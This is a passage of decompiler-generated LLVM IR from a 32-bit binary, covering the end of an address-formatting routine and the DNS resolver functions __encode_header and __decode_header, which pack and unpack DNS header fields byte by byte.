  %v0_8054167 = load i32, i32* @esi, align 4
  %v1_8054167 = add i32 %v0_8054167, 1
  %v0_8054171.pre = load i32, i32* @edi, align 4
  store i32 %v1_8054167, i32* @esi, align 4
  %v7_805416b = icmp sgt i32 %v1_8054167, 7
  %v10_8054171 = icmp eq i32 %v0_8054171.pre, -1
  br i1 %v7_805416b, label %dec_label_pc_8054171, label %dec_label_pc_80540dc

dec_label_pc_8054171:                             ; preds = %dec_label_pc_8054167
  br i1 %v10_8054171, label %dec_label_pc_8054182, label %dec_label_pc_8054176

dec_label_pc_8054176:                             ; preds = %dec_label_pc_8054171, %dec_label_pc_8054142
  %v0_805417e = phi i32 [ %v0_80540f020, %dec_label_pc_8054171 ], [ %v3_805414e, %dec_label_pc_8054142 ]
  %v0_8054176 = phi i32 [ %v0_8054171.pre, %dec_label_pc_8054171 ], [ %v0_8054176.pre, %dec_label_pc_8054142 ]
  %v1_8054176 = load i32, i32* @ebp, align 4
  %v2_8054176 = add i32 %v1_8054176, %v0_8054176
  store i32 %v2_8054176, i32* %eax.global-to-local, align 4
  %v9_8054179 = icmp eq i32 %v2_8054176, 8
  %v1_805417c = icmp eq i1 %v9_8054179, false
  br i1 %v1_805417c, label %dec_label_pc_8054182, label %dec_label_pc_805417e

dec_label_pc_805417e:                             ; preds = %dec_label_pc_8054176
  %v1_805417e = inttoptr i32 %v0_805417e to i8*
  store i8 58, i8* %v1_805417e, align 1
  %v0_8054181 = load i32, i32* @ebx, align 4
  %v1_8054181 = add i32 %v0_8054181, 1
  store i32 %v1_8054181, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054182

dec_label_pc_8054182:                             ; preds = %dec_label_pc_8054176, %dec_label_pc_8054171, %dec_label_pc_805417e
  %v0_8054186 = phi i32 [ %v0_805417e, %dec_label_pc_8054176 ], [ %v0_80540f020, %dec_label_pc_8054171 ], [ %v1_8054181, %dec_label_pc_805417e ]
  store i32 %v2_80540d1, i32* %edx.global-to-local, align 4
  %v1_8054186 = add i32 %v0_8054186, 1
  store i32 %v1_8054186, i32* %eax.global-to-local, align 4
  %v1_8054189 = inttoptr i32 %v0_8054186 to i8*
  store i8 0, i8* %v1_8054189, align 1
  %v0_805418c = load i32, i32* %eax.global-to-local, align 4
  %v1_805418c = load i32, i32* %edx.global-to-local, align 4
  %v2_805418c = sub i32 %v0_805418c, %v1_805418c
  store i32 %v2_805418c, i32* @eax, align 4
  %tmp76 = icmp ugt i32 %v2_805418c, %arg4
  br i1 %tmp76, label %dec_label_pc_8054194, label %dec_label_pc_80541a1

dec_label_pc_8054194:                             ; preds = %dec_label_pc_8054182
  %v0_8054194 = load i8*, i8** %stack_var_-124, align 4
  %v1_8054194 = ptrtoint i8* %v0_8054194 to i32
  %v2_8054194 = call i32 @__errno_location(i32 %v1_8054194)
  store i32 %v2_8054194, i32* %eax.global-to-local, align 4
  %v1_8054199 = inttoptr i32 %v2_8054194 to i32*
  store i32 28, i32* %v1_8054199, align 4
  br label %dec_label_pc_80541c2

dec_label_pc_80541a1:                             ; preds = %dec_label_pc_8054182
  %v0_80541a1 = load i32, i32* @edi, align 4
  store i32 %v0_80541a1, i32* %stack_var_-112, align 4
  %tmp46 = bitcast i8** %stack_var_12 to i32*
  %v3_80541a43 = load i32, i32* %tmp46, align 4
  %tmp47 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80541a43, i32* %tmp47, align 4
  %v0_80541ab.cast = inttoptr i32 %v3_80541a43 to i8*
  %v5_80541ab = call i32 @strcpy(i8* %v0_80541ab.cast, i32 %v2_80540d1)
  store i32 %v5_80541ab, i32* %eax.global-to-local, align 4
  store i32 %v5_80541ab, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80541c4

dec_label_pc_80541b7:                             ; preds = %dec_label_pc_805400d
  %v1_80541b7 = call i32 @__errno_location(i32 %v0_8054000)
  store i32 %v1_80541b7, i32* %eax.global-to-local, align 4
  %v1_80541bc = inttoptr i32 %v1_80541b7 to i32*
  store i32 97, i32* %v1_80541bc, align 4
  br label %dec_label_pc_80541c2

dec_label_pc_80541c2:                             ; preds = %dec_label_pc_8054194, %dec_label_pc_80541b7
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80541c4

dec_label_pc_80541c4:                             ; preds = %dec_label_pc_805411b, %dec_label_pc_80541a1, %dec_label_pc_8054018, %dec_label_pc_80541c2
  %v0_80541c7 = phi i32 [ 0, %dec_label_pc_805411b ], [ %v5_80541ab, %dec_label_pc_80541a1 ], [ %v3_8054024, %dec_label_pc_8054018 ], [ 0, %dec_label_pc_80541c2 ]
  store i32 %v0_80541c7, i32* %eax.global-to-local, align 4
  store i32 %v0_8054000, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80541c7

; uselistorder directives
  uselistorder i32 %v0_80541c7, { 1, 0 }
  uselistorder i32 %v0_8054186, { 1, 0 }
  uselistorder i1 %v10_8054171, { 1, 0 }
  uselistorder i32 %v0_8054171.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8054167, { 1, 0, 2 }
  uselistorder i32 %v1_8054153, { 1, 0 }
  uselistorder i32 %v0_805415c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_80540e8, { 1, 0 }
  uselistorder i32 %v2_80540e1, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.161, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.162, { 2, 1, 0 }
  uselistorder i32 %v0_80540fa63, { 3, 2, 1, 0 }
  uselistorder i32 %v1_80540ec64, { 2, 1, 0 }
  uselistorder i32 %v0_80540f665, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_80540d1, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805417119, { 1, 0 }
  uselistorder i32 %v1_80540c6, { 1, 0 }
  uselistorder i32 %v0_80540c6, { 1, 0, 2 }
  uselistorder i32 %v5_80540ce, { 1, 2, 0 }
  uselistorder i32 %v1_80540a9, { 0, 2, 1 }
  uselistorder i32 %v0_805409910, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80540a414, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8054094, { 1, 0 }
  uselistorder i32 %v0_80540bf67, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80540b468, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80540a970, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805406171, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8054000, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 4, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_8058671.257, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 65535, { 0, 1, 3, 2 }
  uselistorder i32 64, { 7, 2, 9, 6, 8, 5, 1, 3, 0, 4 }
  uselistorder i32* @esp, { 0, 1, 147, 7, 148, 149, 150, 151, 152, 153, 8, 262, 263, 264, 265, 266, 267, 268, 10, 269, 270, 271, 272, 273, 16, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 12, 284, 285, 286, 13, 287, 9, 288, 289, 290, 291, 292, 293, 14, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 11, 307, 308, 309, 310, 311, 312, 15, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 216, 17, 217, 2, 3, 334, 4, 5, 6, 18, 218, 219, 220, 221, 19, 222, 223, 224, 225, 22, 226, 227, 228, 23, 229, 24, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 21, 243, 25, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 20, 256, 257, 258, 259, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 260, 261 }
  uselistorder i32 15, { 0, 4, 8, 7, 1, 6, 5, 2, 3 }
  uselistorder i32 60, { 4, 5, 6, 7, 0, 8, 3, 2, 1 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 12, 11, 14, 13 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 6, 9, 10, 3, 15, 16, 13, 14, 4, 1, 2, 7, 8, 5, 11, 12 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80541c4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80541c2, { 1, 0 }
  uselistorder label %dec_label_pc_8054182, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054167, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80540fe, { 1, 0 }
  uselistorder label %dec_label_pc_80540f6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80540dc, { 1, 0 }
  uselistorder label %dec_label_pc_80540d1, { 1, 0 }
  uselistorder label %dec_label_pc_80540c1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80540bd, { 1, 0 }
  uselistorder label %dec_label_pc_80540a9, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80540a6, { 1, 0 }
  uselistorder label %dec_label_pc_805407c, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80541d4 = load i32, i32* @ebx, align 4
  store i32 %v0_80541d4, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_80541de = ptrtoint i8* %tmp to i32
  store i32 %v4_80541de, i32* %esi.global-to-local, align 4
  %v7_80541e2 = icmp sgt i32 %tmp9, 11
  br i1 %v7_80541e2, label %dec_label_pc_80541e8, label %dec_label_pc_805427c

dec_label_pc_80541e8:                             ; preds = %entry
  %v1_80541e8 = add i32 %tmp8, 1
  %v2_80541e8 = inttoptr i32 %v1_80541e8 to i8*
  %v3_80541e8 = load i8, i8* %v2_80541e8, align 1
  store i8 %v3_80541e8, i8* %tmp, align 1
  %v0_80541ee = load i32, i32* %ebx.global-to-local, align 4
  %v1_80541ee = inttoptr i32 %v0_80541ee to i32*
  %v2_80541ee = load i32, i32* %v1_80541ee, align 4
  %v1_80541f0 = trunc i32 %v2_80541ee to i8
  %v2_80541f0 = load i32, i32* %esi.global-to-local, align 4
  %v3_80541f0 = add i32 %v2_80541f0, 1
  %v4_80541f0 = inttoptr i32 %v3_80541f0 to i8*
  store i8 %v1_80541f0, i8* %v4_80541f0, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_8054215 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054215 = add i32 %v0_8054215, 8
  %v2_8054215 = inttoptr i32 %v1_8054215 to i32*
  %v3_8054215 = load i32, i32* %v2_8054215, align 4
  %v1_8054218 = mul i32 %v3_8054215, 8
  %v2_805421b = and i32 %v1_8054218, 120
  %v2_805421e = or i32 %v2_805421b, 4
  store i32 %v2_805421e, i32* %edx.global-to-local, align 4
  %v1_8054220 = add i32 %v0_8054215, 20
  %v2_8054220 = inttoptr i32 %v1_8054220 to i32*
  %v3_8054220 = load i32, i32* %v2_8054220, align 4
  %v4_8054220 = icmp eq i32 %v3_8054220, 0
  %v1_8054224 = icmp eq i1 %v4_8054220, false
  %v2_8054224 = zext i1 %v1_8054224 to i32
  %v2_8054227 = or i32 %v2_8054224, %v2_805421e
  store i32 %v2_8054227, i32* %edx.global-to-local, align 4
  %v2_8054229 = or i32 %v2_8054227, 130
  %v3_8054229 = trunc i32 %v2_8054229 to i8
  store i32 %v2_8054229, i32* @ecx, align 4
  %v2_805422b = load i32, i32* %esi.global-to-local, align 4
  %v3_805422b = add i32 %v2_805422b, 2
  %v4_805422b = inttoptr i32 %v3_805422b to i8*
  store i8 %v3_8054229, i8* %v4_805422b, align 1
  %v0_805422e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054232 = add i32 %v0_805422e, 28
  %v2_8054232 = inttoptr i32 %v1_8054232 to i8*
  %v3_8054232 = load i8, i8* %v2_8054232, align 1
  %v5_8054232 = load i32, i32* %edx.global-to-local, align 4
  %v2_805423b = urem i8 %v3_8054232, 16
  %v7_805423b = zext i8 %v2_805423b to i32
  %v9_805423b = and i32 %v5_8054232, -256
  %v10_805423b = or i32 %v9_805423b, %v7_805423b
  store i32 %v10_805423b, i32* %edx.global-to-local, align 4
  %v2_805423e = or i8 %v2_805423b, -128
  %v2_8054240 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054240 = add i32 %v2_8054240, 3
  %v4_8054240 = inttoptr i32 %v3_8054240 to i8*
  store i8 %v2_805423e, i8* %v4_8054240, align 1
  %v0_8054243 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054243 = add i32 %v0_8054243, 33
  %v2_8054243 = inttoptr i32 %v1_8054243 to i8*
  %v3_8054243 = load i8, i8* %v2_8054243, align 1
  %v2_8054247 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054247 = add i32 %v2_8054247, 4
  %v4_8054247 = inttoptr i32 %v3_8054247 to i8*
  store i8 %v3_8054243, i8* %v4_8054247, align 1
  %v0_805424a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805424a = add i32 %v0_805424a, 32
  %v2_805424a = inttoptr i32 %v1_805424a to i32*
  %v3_805424a = load i32, i32* %v2_805424a, align 4
  %v1_805424d = trunc i32 %v3_805424a to i8
  %v2_805424d = load i32, i32* %esi.global-to-local, align 4
  %v3_805424d = add i32 %v2_805424d, 5
  %v4_805424d = inttoptr i32 %v3_805424d to i8*
  store i8 %v1_805424d, i8* %v4_805424d, align 1
  %v0_8054250 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054250 = add i32 %v0_8054250, 37
  %v2_8054250 = inttoptr i32 %v1_8054250 to i8*
  %v3_8054250 = load i8, i8* %v2_8054250, align 1
  %v2_8054254 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054254 = add i32 %v2_8054254, 6
  %v4_8054254 = inttoptr i32 %v3_8054254 to i8*
  store i8 %v3_8054250, i8* %v4_8054254, align 1
  %v0_8054257 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054257 = add i32 %v0_8054257, 36
  %v2_8054257 = inttoptr i32 %v1_8054257 to i32*
  %v3_8054257 = load i32, i32* %v2_8054257, align 4
  %v1_805425a = trunc i32 %v3_8054257 to i8
  %v2_805425a = load i32, i32* %esi.global-to-local, align 4
  %v3_805425a = add i32 %v2_805425a, 7
  %v4_805425a = inttoptr i32 %v3_805425a to i8*
  store i8 %v1_805425a, i8* %v4_805425a, align 1
  %v0_805425d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805425d = add i32 %v0_805425d, 41
  %v2_805425d = inttoptr i32 %v1_805425d to i8*
  %v3_805425d = load i8, i8* %v2_805425d, align 1
  %v2_8054261 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054261 = add i32 %v2_8054261, 8
  %v4_8054261 = inttoptr i32 %v3_8054261 to i8*
  store i8 %v3_805425d, i8* %v4_8054261, align 1
  %v0_8054264 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054264 = add i32 %v0_8054264, 40
  %v2_8054264 = inttoptr i32 %v1_8054264 to i32*
  %v3_8054264 = load i32, i32* %v2_8054264, align 4
  %v1_8054267 = trunc i32 %v3_8054264 to i8
  %v2_8054267 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054267 = add i32 %v2_8054267, 9
  %v4_8054267 = inttoptr i32 %v3_8054267 to i8*
  store i8 %v1_8054267, i8* %v4_8054267, align 1
  %v0_805426a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805426a = add i32 %v0_805426a, 45
  %v2_805426a = inttoptr i32 %v1_805426a to i8*
  %v3_805426a = load i8, i8* %v2_805426a, align 1
  %v2_805426e = load i32, i32* %esi.global-to-local, align 4
  %v3_805426e = add i32 %v2_805426e, 10
  %v4_805426e = inttoptr i32 %v3_805426e to i8*
  store i8 %v3_805426a, i8* %v4_805426e, align 1
  %v0_8054271 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054271 = add i32 %v0_8054271, 44
  %v2_8054271 = inttoptr i32 %v1_8054271 to i32*
  %v3_8054271 = load i32, i32* %v2_8054271, align 4
  %v1_8054274 = trunc i32 %v3_8054271 to i8
  %v2_8054274 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054274 = add i32 %v2_8054274, 11
  %v4_8054274 = inttoptr i32 %v3_8054274 to i8*
  store i8 %v1_8054274, i8* %v4_8054274, align 1
  %v2_805427c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805427c

dec_label_pc_805427c:                             ; preds = %entry, %dec_label_pc_80541e8
  %v2_805427c = phi i32 [ %v0_80541d4, %entry ], [ %v2_805427c.pre, %dec_label_pc_80541e8 ]
  %v0_805427e = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_80541e8 ]
  store i32 %v2_805427c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805427e

; uselistorder directives
  uselistorder i32 45, { 4, 1, 3, 0, 2 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 3, 1, 0, 2 }
  uselistorder i32 33, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_805427c, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8054280 = load i32, i32* @ebx, align 4
  store i32 %v0_8054280, i32* %stack_var_-4, align 4
  %v4_8054281 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8054281, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8054289 = load i8, i8* %tmp2, align 1
  %v3_8054289 = zext i8 %v2_8054289 to i32
  %v1_805428c = add i32 %v4_8054281, 1
  %v2_805428c = inttoptr i32 %v1_805428c to i8*
  %v3_805428c = load i8, i8* %v2_805428c, align 1
  %v4_805428c = zext i8 %v3_805428c to i32
  %v2_8054290 = mul nuw nsw i32 %v3_8054289, 256
  %v2_8054293 = or i32 %v4_805428c, %v2_8054290
  %v2_8054295 = inttoptr i32 %tmp to i32*
  store i32 %v2_8054293, i32* %v2_8054295, align 4
  %v0_8054297 = load i32, i32* @ecx, align 4
  %v1_8054297 = add i32 %v0_8054297, 2
  %v2_8054297 = inttoptr i32 %v1_8054297 to i8*
  %v3_8054297 = load i8, i8* %v2_8054297, align 1
  %tmp6 = icmp slt i8 %v3_8054297, 0
  %v2_805429b = zext i1 %tmp6 to i32
  %v1_805429e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805429e = add i32 %v1_805429e, 4
  %v3_805429e = inttoptr i32 %v2_805429e to i32*
  store i32 %v2_805429b, i32* %v3_805429e, align 4
  %v0_80542a1 = load i32, i32* @ecx, align 4
  %v1_80542a1 = add i32 %v0_80542a1, 2
  %v2_80542a1 = inttoptr i32 %v1_80542a1 to i8*
  %v3_80542a1 = load i8, i8* %v2_80542a1, align 1
  %v3_80542a4 = udiv i8 %v3_80542a1, 8
  %tmp7 = urem i8 %v3_80542a4, 16
  %v1_80542a7 = zext i8 %tmp7 to i32
  %v1_80542aa = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542aa = add i32 %v1_80542aa, 8
  %v3_80542aa = inttoptr i32 %v2_80542aa to i32*
  store i32 %v1_80542a7, i32* %v3_80542aa, align 4
  %v0_80542ad = load i32, i32* @ecx, align 4
  %v1_80542ad = add i32 %v0_80542ad, 2
  %v2_80542ad = inttoptr i32 %v1_80542ad to i8*
  %v3_80542ad = load i8, i8* %v2_80542ad, align 1
  %div = udiv i8 %v3_80542ad, 4
  %tmp8 = urem i8 %div, 2
  %v1_80542b4 = zext i8 %tmp8 to i32
  %v1_80542b7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542b7 = add i32 %v1_80542b7, 12
  %v3_80542b7 = inttoptr i32 %v2_80542b7 to i32*
  store i32 %v1_80542b4, i32* %v3_80542b7, align 4
  %v0_80542ba = load i32, i32* @ecx, align 4
  %v1_80542ba = add i32 %v0_80542ba, 2
  %v2_80542ba = inttoptr i32 %v1_80542ba to i8*
  %v3_80542ba = load i8, i8* %v2_80542ba, align 1
  %div5 = udiv i8 %v3_80542ba, 2
  %tmp9 = urem i8 %div5, 2
  %v1_80542c0 = zext i8 %tmp9 to i32
  %v1_80542c3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542c3 = add i32 %v1_80542c3, 16
  %v3_80542c3 = inttoptr i32 %v2_80542c3 to i32*
  store i32 %v1_80542c0, i32* %v3_80542c3, align 4
  %v0_80542c6 = load i32, i32* @ecx, align 4
  %v1_80542c6 = add i32 %v0_80542c6, 2
  %v2_80542c6 = inttoptr i32 %v1_80542c6 to i8*
  %v3_80542c6 = load i8, i8* %v2_80542c6, align 1
  %tmp10 = urem i8 %v3_80542c6, 2
  %v1_80542ca = zext i8 %tmp10 to i32
  %v1_80542cd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542cd = add i32 %v1_80542cd, 20
  %v3_80542cd = inttoptr i32 %v2_80542cd to i32*
  store i32 %v1_80542ca, i32* %v3_80542cd, align 4
  %v0_80542d0 = load i32, i32* @ecx, align 4
  %v1_80542d0 = add i32 %v0_80542d0, 3
  %v2_80542d0 = inttoptr i32 %v1_80542d0 to i8*
  %v3_80542d0 = load i8, i8* %v2_80542d0, align 1
  %tmp11 = icmp slt i8 %v3_80542d0, 0
  %v2_80542d4 = zext i1 %tmp11 to i32
  %v1_80542d7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542d7 = add i32 %v1_80542d7, 24
  %v3_80542d7 = inttoptr i32 %v2_80542d7 to i32*
  store i32 %v2_80542d4, i32* %v3_80542d7, align 4
  %v0_80542da = load i32, i32* @ecx, align 4
  %v1_80542da = add i32 %v0_80542da, 3
  %v2_80542da = inttoptr i32 %v1_80542da to i8*
  %v3_80542da = load i8, i8* %v2_80542da, align 1
  %tmp12 = urem i8 %v3_80542da, 16
  %v1_80542de = zext i8 %tmp12 to i32
  %v1_80542e1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542e1 = add i32 %v1_80542e1, 28
  %v3_80542e1 = inttoptr i32 %v2_80542e1 to i32*
  store i32 %v1_80542de, i32* %v3_80542e1, align 4
  %v0_80542e4 = load i32, i32* @ecx, align 4
  %v1_80542e4 = add i32 %v0_80542e4, 4
  %v2_80542e4 = inttoptr i32 %v1_80542e4 to i8*
  %v3_80542e4 = load i8, i8* %v2_80542e4, align 1
  %v4_80542e4 = zext i8 %v3_80542e4 to i32
  %v1_80542e8 = add i32 %v0_80542e4, 5
  %v2_80542e8 = inttoptr i32 %v1_80542e8 to i8*
  %v3_80542e8 = load i8, i8* %v2_80542e8, align 1
  %v4_80542e8 = zext i8 %v3_80542e8 to i32
  %v2_80542ec = mul nuw nsw i32 %v4_80542e4, 256
  %v2_80542ef = or i32 %v4_80542e8, %v2_80542ec
  %v1_80542f1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542f1 = add i32 %v1_80542f1, 32
  %v3_80542f1 = inttoptr i32 %v2_80542f1 to i32*
  store i32 %v2_80542ef, i32* %v3_80542f1, align 4
  %v0_80542f4 = load i32, i32* @ecx, align 4
  %v1_80542f4 = add i32 %v0_80542f4, 6
  %v2_80542f4 = inttoptr i32 %v1_80542f4 to i8*
  %v3_80542f4 = load i8, i8* %v2_80542f4, align 1
  %v4_80542f4 = zext i8 %v3_80542f4 to i32
  %v1_80542f8 = add i32 %v0_80542f4, 7
  %v2_80542f8 = inttoptr i32 %v1_80542f8 to i8*
  %v3_80542f8 = load i8, i8* %v2_80542f8, align 1
  %v4_80542f8 = zext i8 %v3_80542f8 to i32
  %v2_80542fc = mul nuw nsw i32 %v4_80542f4, 256
  %v2_80542ff = or i32 %v4_80542f8, %v2_80542fc
  %v1_8054301 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054301 = add i32 %v1_8054301, 36
  %v3_8054301 = inttoptr i32 %v2_8054301 to i32*
  store i32 %v2_80542ff, i32* %v3_8054301, align 4
  %v0_8054304 = load i32, i32* @ecx, align 4
  %v1_8054304 = add i32 %v0_8054304, 8
  %v2_8054304 = inttoptr i32 %v1_8054304 to i8*
  %v3_8054304 = load i8, i8* %v2_8054304, align 1
  %v4_8054304 = zext i8 %v3_8054304 to i32
  %v1_8054308 = add i32 %v0_8054304, 9
  %v2_8054308 = inttoptr i32 %v1_8054308 to i8*
  %v3_8054308 = load i8, i8* %v2_8054308, align 1
  %v4_8054308 = zext i8 %v3_8054308 to i32
  %v2_805430c = mul nuw nsw i32 %v4_8054304, 256
  %v2_805430f = or i32 %v4_8054308, %v2_805430c
  %v1_8054311 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054311 = add i32 %v1_8054311, 40
  %v3_8054311 = inttoptr i32 %v2_8054311 to i32*
  store i32 %v2_805430f, i32* %v3_8054311, align 4
  %v0_8054314 = load i32, i32* @ecx, align 4
  %v1_8054314 = add i32 %v0_8054314, 10
  %v2_8054314 = inttoptr i32 %v1_8054314 to i8*
  %v3_8054314 = load i8, i8* %v2_8054314, align 1
  %v4_8054314 = zext i8 %v3_8054314 to i32
  %v1_8054318 = add i32 %v0_8054314, 11
  %v2_8054318 = inttoptr i32 %v1_8054318 to i8*
  %v3_8054318 = load i8, i8* %v2_8054318, align 1
  %v4_8054318 = zext i8 %v3_8054318 to i32
  %v2_805431c = mul nuw nsw i32 %v4_8054314, 256
  %v2_805431f = or i32 %v4_8054318, %v2_805431c
  %v1_8054321 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054321 = add i32 %v1_8054321, 44
  %v3_8054321 = inttoptr i32 %v2_8054321 to i32*
  store i32 %v2_805431f, i32* %v3_8054321, align 4
  %v2_8054329 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054329, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 14, 15, 2, 3, 7, 8, 16, 4, 9, 10, 11, 12, 5, 13, 1, 6, 0 }
  uselistorder i32 40, { 8, 9, 3, 11, 12, 10, 0, 1, 4, 5, 6, 7, 2 }
  uselistorder i32 7, { 20, 21, 4, 7, 5, 0, 3, 8, 15, 16, 17, 18, 19, 6, 2, 1, 14, 9, 10, 11, 12, 13 }
  uselistorder i32 6, { 23, 24, 0, 1, 10, 21, 3, 18, 11, 12, 7, 26, 13, 22, 4, 5, 2, 6, 9, 8, 14, 20, 15, 19, 16, 17, 25 }
  uselistorder i32 28, { 34, 35, 17, 18, 36, 25, 48, 47, 40, 41, 0, 42, 43, 44, 45, 46, 3, 4, 5, 1, 26, 16, 19, 20, 37, 38, 27, 28, 29, 30, 31, 32, 2, 33, 49, 39, 21, 22, 23, 6, 7, 24, 12, 11, 9, 10, 13, 14, 8, 15 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 18, 6, 0, 22, 19, 7, 8, 9, 10, 11, 12, 20, 21, 13, 16, 17, 14, 15 }
  uselistorder i8 4, { 0, 4, 5, 2, 3, 1 }
  uselistorder i8 16, { 2, 3, 4, 8, 9, 10, 6, 7, 5, 0, 1 }
  uselistorder i8 8, { 0, 8, 3, 7, 4, 5, 6, 1, 2 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_805432c = load i32, i32* @edi, align 4
  %v0_805432d = load i32, i32* @esi, align 4
  %v0_805432e = load i32, i32* @ebx, align 4
  store i32 %v0_805432e, i32* %stack_var_-12, align 4
